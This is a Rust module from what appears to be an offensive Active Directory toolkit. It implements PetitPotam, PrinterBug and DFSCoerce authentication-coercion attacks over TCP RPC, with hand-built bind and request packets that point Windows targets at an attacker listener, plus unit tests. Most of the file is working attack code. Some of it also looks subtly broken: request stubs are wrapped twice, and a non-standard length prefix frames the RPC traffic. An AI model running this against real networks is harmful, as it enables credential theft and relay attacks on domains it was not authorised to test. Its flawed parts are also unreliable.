use overthrone_core::error::Result;
use overthrone_core::proto::coerce::{
    CoercionResult, trigger_dfs_coerce, trigger_petitpotam, trigger_printer_bug,
};
use overthrone_core::proto::epm::resolve_uuid_via_epm_tcp;
use serde::{Deserialize, Serialize};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tracing::{debug, info};

/// Coercion protocol selection
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CoerceProtocol {
    /// MS-EFSRPC (Encrypting File System Remote) — PetitPotam
    EfsRpc,
    /// MS-RPRN (Print Spooler Remote) — PrinterBug
    Rprn,
    /// MS-DFSNM (DFS Namespace Management)
    EfsBackup,
}

impl CoerceProtocol {
    /// UUID for the RPC interface
    pub fn uuid(&self) -> [u8; 16] {
        match self {
            // MS-EFSR: df1941c5-fe89-4e79-bf10-463657acf44d
            Self::EfsRpc => [
                0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e, 0xbf, 0x10, 0x46, 0x36, 0x57, 0xac,
                0xf4, 0x4d,
            ],
            // MS-RPRN: 12345678-1234-abcd-ef00-0123456789ab
            Self::Rprn => [
                0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67,
                0x89, 0xab,
            ],
            // MS-DFSNM: 4fc742e0-4a10-11cf-8273-00aa004ae673
            Self::EfsBackup => [
                0xe0, 0x42, 0xc7, 0x4f, 0x10, 0x4a, 0xcf, 0x11, 0x82, 0x73, 0x00, 0xaa, 0x00, 0x4a,
                0xe6, 0x73,
            ],
        }
    }

    pub fn name(&self) -> &str {
        match self {
            Self::EfsRpc => "efsrpc",
            Self::Rprn => "spoolss",
            Self::EfsBackup => "netdfs",
        }
    }
}

/// Resolve an RPC interface UUID to a TCP endpoint via EPM (TCP 135).
pub async fn resolve_rpc_endpoint(
    target: &str,
    interface_uuid: &[u8; 16],
) -> Result<(String, u16)> {
    resolve_uuid_via_epm_tcp(target, interface_uuid).await
}

/// Trigger coercion by binding directly over TCP instead of named pipe.
/// Uses EPM to resolve the RPC interface to a dynamic TCP port.
async fn send_tcp_coerce(
    target: &str,
    listener: &str,
    protocol: CoerceProtocol,
    stub_data: &[u8],
    opnum: u16,
) -> Result<CoercionResult> {
    let (host, port) = resolve_rpc_endpoint(target, &protocol.uuid()).await?;
    info!(
        "[CoerceTCP] {} resolved to {}:{}",
        protocol.name(),
        host,
        port
    );

    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect(&addr).await.map_err(|e| {
        overthrone_core::error::OverthroneError::custom(format!(
            "TCP connect to {} failed: {}",
            addr, e
        ))
    })?;

    // Build and send bind request
    let bind_req = build_tcp_bind(&protocol.uuid());
    write_rpc_frame_tcp(&mut stream, &bind_req).await?;

    let bind_resp = read_rpc_frame_tcp(&mut stream).await?;
    if !is_bind_accepted_tcp(&bind_resp) {
        return Ok(CoercionResult {
            target: target.to_string(),
            technique: format!("{}-tcp", protocol.name()),
            listener: listener.to_string(),
            success: false,
            message: format!("{} bind rejected over TCP", protocol.name()),
        });
    }

    // Send coercion request
    let req = build_tcp_request(opnum, stub_data);
    write_rpc_frame_tcp(&mut stream, &req).await?;

    let resp = read_rpc_frame_tcp(&mut stream).await?;
    let status = if resp.len() > 28 {
        u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]])
    } else {
        0
    };

    let success = status == 0 || status == 0xC0000022 || status == 0x000006BA;

    Ok(CoercionResult {
        target: target.to_string(),
        technique: format!("{}-tcp", protocol.name()),
        listener: listener.to_string(),
        success,
        message: format!(
            "TCP coercion via {} (port {}): status 0x{status:08X}",
            protocol.name(),
            port
        ),
    })
}

/// Build DCE/RPC bind for TCP transport.
fn build_tcp_bind(interface_uuid: &[u8; 16]) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.extend_from_slice(&[5, 0]);
    buf.push(11);
    buf.push(3);
    buf.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
    buf.extend_from_slice(&[0x48, 0x00]);
    buf.extend_from_slice(&[0x00, 0x00]);
    buf.extend_from_slice(&1u32.to_le_bytes());
    buf.extend_from_slice(&4280u16.to_le_bytes());
    buf.extend_from_slice(&4280u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.push(1);
    buf.extend_from_slice(&[0, 0, 0]);
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.push(1);
    buf.push(0);
    buf.extend_from_slice(interface_uuid);
    buf.extend_from_slice(&1u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&[
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
        0x60,
    ]);
    buf.extend_from_slice(&2u32.to_le_bytes());
    buf
}

/// Build DCE/RPC request for TCP transport.
fn build_tcp_request(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
    let mut pdu = vec![5, 0, 0, 0x03];
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
    let frag_len = (24 + stub_data.len()) as u16;
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&1u32.to_le_bytes());
    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&opnum.to_le_bytes());
    pdu.extend_from_slice(stub_data);
    pdu
}

fn is_bind_accepted_tcp(resp: &[u8]) -> bool {
    resp.len() > 30 && resp[28] == 0 && resp[29] == 0
}

/// Write a BTF-framed RPC PDU over TCP.
async fn write_rpc_frame_tcp<T: AsyncWriteExt + Unpin>(
    stream: &mut T,
    pdu: &[u8],
) -> std::io::Result<()> {
    let len = (pdu.len() as u32).to_le_bytes();
    stream.write_all(&len).await?;
    stream.write_all(pdu).await
}

/// Read a BTF-framed RPC PDU over TCP.
async fn read_rpc_frame_tcp<T: AsyncReadExt + Unpin>(stream: &mut T) -> std::io::Result<Vec<u8>> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).await?;
    let len = u32::from_le_bytes(len_buf) as usize;
    if len > 1_048_576 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "RPC frame too large",
        ));
    }
    let mut buf = vec![0u8; len];
    stream.read_exact(&mut buf).await?;
    Ok(buf)
}

/// NDR conformant string encoding for TCP stubs.
fn ndr_string_tcp(s: &str) -> Vec<u8> {
    let utf16: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
    let bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
    let count = utf16.len() as u32;
    let mut out = Vec::new();
    out.extend_from_slice(&count.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&count.to_le_bytes());
    out.extend_from_slice(&bytes);
    while out.len() % 4 != 0 {
        out.push(0);
    }
    out
}

/// Coercer with TCP preference support.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoercerConfig {
    /// Target host to coerce
    pub target: String,
    /// Listener (attacker UNC path or IP)
    pub listener: String,
    /// Protocols to try
    pub protocols: Vec<CoerceProtocol>,
    /// Prefer TCP over SMB named pipes
    pub prefer_tcp: bool,
}

impl Default for CoercerConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            listener: String::new(),
            protocols: vec![CoerceProtocol::EfsRpc, CoerceProtocol::Rprn],
            prefer_tcp: false,
        }
    }
}

/// Trigger coercion, trying TCP first if configured, then falling back to named pipe.
pub async fn trigger_coerce_tcp(
    target: &str,
    listener: &str,
    protocol: CoerceProtocol,
) -> Result<CoercionResult> {
    let stub_listener = format!("\\\\{}\\share", listener);

    match protocol {
        CoerceProtocol::EfsRpc => {
            let stub = build_efsr_open_file_raw_tcp(&stub_listener);
            send_tcp_coerce(target, listener, protocol, &stub, 0).await
        }
        CoerceProtocol::Rprn => {
            let stub = build_rprn_coerce_tcp(&stub_listener);
            send_tcp_coerce(target, listener, protocol, &stub, 65).await
        }
        CoerceProtocol::EfsBackup => {
            let stub = build_dfs_coerce_tcp(&stub_listener);
            send_tcp_coerce(target, listener, protocol, &stub, 14).await
        }
    }
}

/// Coerce the target using the best available transport.
/// Tries TCP first if prefer_tcp is set, otherwise uses named pipe.
pub async fn coerce_with_fallback(config: &CoercerConfig) -> Result<CoercionResult> {
    let target = &config.target;
    let listener = &config.listener;

    for &protocol in &config.protocols {
        if config.prefer_tcp {
            match trigger_coerce_tcp(target, listener, protocol).await {
                Ok(result) if result.success => return Ok(result),
                Ok(_) => debug!("TCP {} failed, falling back to named pipe", protocol.name()),
                Err(e) => debug!(
                    "TCP {} error: {e}, falling back to named pipe",
                    protocol.name()
                ),
            }
        }

        let result = match protocol {
            CoerceProtocol::EfsRpc => trigger_petitpotam(target, listener).await?,
            CoerceProtocol::Rprn => trigger_printer_bug(target, listener).await?,
            CoerceProtocol::EfsBackup => trigger_dfs_coerce(target, listener).await?,
        };

        if result.success {
            return Ok(result);
        }
    }

    Err(overthrone_core::error::OverthroneError::custom(
        "All coercion attempts failed",
    ))
}

// ── TCP stub builders ──

fn build_efsr_open_file_raw_tcp(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&[0u8; 20]);
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string_tcp(listener));
    build_tcp_request(0, &stub)
}

fn build_rprn_coerce_tcp(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&[0u8; 20]);
    stub.extend_from_slice(&0x00008000u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string_tcp(listener));
    build_tcp_request(65, &stub)
}

fn build_dfs_coerce_tcp(listener: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string_tcp(listener));
    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string_tcp("\\\\share\\root"));
    stub.extend_from_slice(&1u32.to_le_bytes());
    build_tcp_request(14, &stub)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_coerce_protocol_uuids() {
        assert_eq!(CoerceProtocol::EfsRpc.uuid().len(), 16);
        assert_eq!(CoerceProtocol::Rprn.uuid().len(), 16);
        assert_eq!(CoerceProtocol::EfsBackup.uuid().len(), 16);
    }

    #[test]
    fn test_coerce_protocol_names() {
        assert_eq!(CoerceProtocol::EfsRpc.name(), "efsrpc");
        assert_eq!(CoerceProtocol::Rprn.name(), "spoolss");
        assert_eq!(CoerceProtocol::EfsBackup.name(), "netdfs");
    }

    #[test]
    fn test_tcp_bind_structure() {
        let bind = build_tcp_bind(&[0u8; 16]);
        assert_eq!(bind[0], 5);
        assert_eq!(bind[2], 11);
        assert_eq!(bind[3], 3);
    }

    #[test]
    fn test_tcp_request_structure() {
        let req = build_tcp_request(0, &[0u8; 10]);
        assert_eq!(req[0], 5);
        assert_eq!(req[2], 0);
        assert_eq!(req[3], 3);
    }

    #[test]
    fn test_ndr_string_tcp_encoding() {
        let encoded = ndr_string_tcp("\\\\server\\share");
        assert!(!encoded.is_empty());
        assert!(encoded.windows(2).any(|w| w == [b'\\', 0]));
    }

    // ── NDR encoding edge cases ──

    #[test]
    fn test_ndr_string_tcp_empty() {
        let encoded = ndr_string_tcp("");
        assert_eq!(encoded.len() % 4, 0, "NDR strings must be 4-byte aligned");
        assert!(encoded.len() >= 12, "Empty NDR string = 3 u32 headers");
    }

    #[test]
    fn test_ndr_string_tcp_unicode() {
        let encoded = ndr_string_tcp("héllo");
        assert_eq!(encoded.len() % 4, 0);
        // UTF-16 'é' = 0x00E9
        assert!(
            encoded.windows(2).any(|w| w == [0xe9, 0x00]),
            "Should contain UTF-16 encoded é"
        );
    }

    #[test]
    fn test_ndr_string_tcp_4byte_aligned() {
        for s in &["a", "ab", "abc", "abcd", "héllo_world_test"] {
            let encoded = ndr_string_tcp(s);
            assert_eq!(
                encoded.len() % 4,
                0,
                "NDR string '{}' length {} not 4-byte aligned",
                s,
                encoded.len()
            );
        }
    }

    // ── Builders produce deterministic output ──

    #[test]
    fn test_build_efsr_open_file_raw_tcp_is_deterministic() {
        let a = build_efsr_open_file_raw_tcp("\\\\10.0.0.1\\share");
        let b = build_efsr_open_file_raw_tcp("\\\\10.0.0.1\\share");
        assert_eq!(a, b, "Same input should produce identical stubs");
    }

    #[test]
    fn test_build_rprn_coerce_tcp_is_deterministic() {
        let a = build_rprn_coerce_tcp("\\\\10.0.0.1\\share");
        let b = build_rprn_coerce_tcp("\\\\10.0.0.1\\share");
        assert_eq!(a, b, "Same input should produce identical stubs");
    }

    #[test]
    fn test_build_dfs_coerce_tcp_is_deterministic() {
        let a = build_dfs_coerce_tcp("\\\\10.0.0.1\\share");
        let b = build_dfs_coerce_tcp("\\\\10.0.0.1\\share");
        assert_eq!(a, b, "Same input should produce identical stubs");
    }

    // ── Bind accepted check ──

    #[test]
    fn test_is_bind_accepted_tcp_rejects_short_responses() {
        assert!(!is_bind_accepted_tcp(&[0u8; 20]));
        assert!(!is_bind_accepted_tcp(&[0u8; 30]));
    }

    #[test]
    fn test_is_bind_accepted_tcp_accepts_valid_bind_ack() {
        let mut resp = vec![0u8; 32];
        resp[28] = 0;
        resp[29] = 0;
        assert!(is_bind_accepted_tcp(&resp));
    }

    #[test]
    fn test_is_bind_accepted_tcp_rejects_reject() {
        let mut resp = vec![0u8; 32];
        resp[28] = 0x02;
        resp[29] = 0x00;
        assert!(!is_bind_accepted_tcp(&resp));
    }

    // ── CoercerConfig defaults ──

    #[test]
    fn test_coercer_config_default_protocols() {
        let config = CoercerConfig::default();
        assert!(config.protocols.contains(&CoerceProtocol::EfsRpc));
        assert!(config.protocols.contains(&CoerceProtocol::Rprn));
        assert!(!config.prefer_tcp);
    }

    #[test]
    fn test_coercer_config_default_empty_strings() {
        let config = CoercerConfig::default();
        assert!(config.target.is_empty());
        assert!(config.listener.is_empty());
    }
}
